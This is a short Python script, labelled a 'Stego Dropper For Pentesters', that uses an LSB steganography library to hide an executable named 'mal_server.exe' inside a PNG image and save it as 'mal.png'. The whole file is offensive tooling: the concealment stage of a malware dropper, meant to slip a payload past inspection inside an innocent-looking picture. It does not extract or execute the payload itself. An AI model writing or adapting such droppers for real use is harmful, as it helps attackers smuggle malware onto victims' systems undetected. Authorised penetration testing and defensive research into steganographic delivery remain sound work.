#!/usr/bin/python
# Stego Dropper For Pentesters v0.1
# Uses https://github.com/RobinDavid/LSB-Steganography

from LSBSteg import LSBSteg
import cv2.cv as cv
import sys

INPUT_IMG = "image.png"
PAYLOAD = "mal_server.exe"
OUTPUT_IMG = "mal.png"

#Hide payload in image, output new stego image
carrier = cv.LoadImage(INPUT_IMG)
steg = LSBSteg(carrier)
steg.hideBin(PAYLOAD)
steg.saveImage(OUTPUT_IMG)

